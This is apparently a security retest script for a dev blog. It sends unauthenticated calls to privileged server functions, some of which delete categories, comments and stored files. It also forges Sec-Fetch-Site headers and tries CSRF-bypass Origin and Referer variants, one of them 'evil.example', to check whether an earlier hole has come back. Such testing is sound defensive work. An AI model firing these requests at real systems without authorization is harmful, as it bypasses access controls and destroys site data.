// 复扫 B-01:未授权直调全部特权 server function + CSRF 绕过变体矩阵
import { toJSONAsync } from 'seroval'

const BASE = 'https://torchwood-blog-dev.deeploop.run'
const FNS = {
  createCategory: { id: '96ffab79262343c4b20c8bb6c58d9e63f9d8b82b0f90169e3bc066ca87a94ad2', data: { name: 'RESCAN', slug: `rescan-${Date.now().toString(36)}` } },
  deleteCategory: { id: 'd77a92147f763545169c1885e518c06fb5afc0446799de6c0c54c04448564b1d', data: { categoryId: 'cat-tech' } },
  renameCategory: { id: 'ce1b3447b04400a77ea5c087da3fa4cb41e9074878c626b75a88dbed54b85d8d', data: { categoryId: 'cat-tech', name: 'RESCAN' } },
  cleanupCommentsForPost: { id: '424b3ebb8f8cbbafb3d984a3a9376b3577d717d850a186df8891b9b03b9118e2', data: { postId: 'post-why-i-blog' } },
  deleteStorageFiles: { id: '84492224ac261e0b6bb274a7722ecbc1fa696ad3d1ea2dcd64bae2cb548ef3c4', data: { fileIds: ['00000000-0000-4000-8000-000000000000'] } },
  getFiles: { id: 'd46fbe7aa4c83ac30d0014f8f70066d59a322cc55fa32cd90fcda5b75d7ae014', data: { fileIds: [] } },
}

async function call(fnId, data, extraHeaders = {}) {
  const payload = JSON.stringify(await toJSONAsync({ data }))
  const res = await fetch(`${BASE}/_serverFn/${fnId}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-tsr-serverFn': 'true', ...extraHeaders, ...(payload ? {} : {}) },
    body: payload,
  })
  const text = await res.text()
  return { status: res.status, text: text.slice(0, 260) }
}

const hdr = { 'sec-fetch-site': 'same-origin' }
console.log('=== A. 未授权 + Sec-Fetch-Site 伪造(旧漏洞的利用路径)===')
for (const [name, { id, data }] of Object.entries(FNS)) {
  const r = await call(id, data, hdr)
  const rejected = r.text.includes('未登录') || r.status === 401
  const forbidden = r.status === 403
  console.log(`${rejected ? 'REJECTED' : forbidden ? 'CSRF-403' : '!!LEAK/OK!!'}  ${name}: ${r.status} ${r.text.slice(0, 110)}`)
}

console.log('\n=== B. deleteCategory CSRF 绕过变体(若任一绕过 CSRF 且未登录成功 = 漏洞回归)===')
const variants = [
  ['无任何头', {}],
  ['Origin: null', { origin: 'null' }],
  ['Origin 异域', { origin: 'https://evil.example' }],
  ['Origin 同域(http)', { origin: 'http://torchwood-blog-dev.deeploop.run' }],
  ['Sec-Fetch-Site: cross-site', { 'sec-fetch-site': 'cross-site' }],
  ['Sec-Fetch-Site: same-origin(基准)', hdr],
  ['Referer 同域', { referer: `${BASE}/admin` }],
]
for (const [label, h] of variants) {
  const { id, data } = FNS.deleteCategory
  const r = await call(id, data, h)
  const outcome = r.text.includes('未登录') ? 'AUTH-WALL(过CSRF,被鉴权拦)' : r.status === 403 ? 'CSRF-403' : `!!${r.status}!!`
  console.log(`${outcome.padEnd(26)} ${label}: ${r.text.slice(0, 90)}`)
}
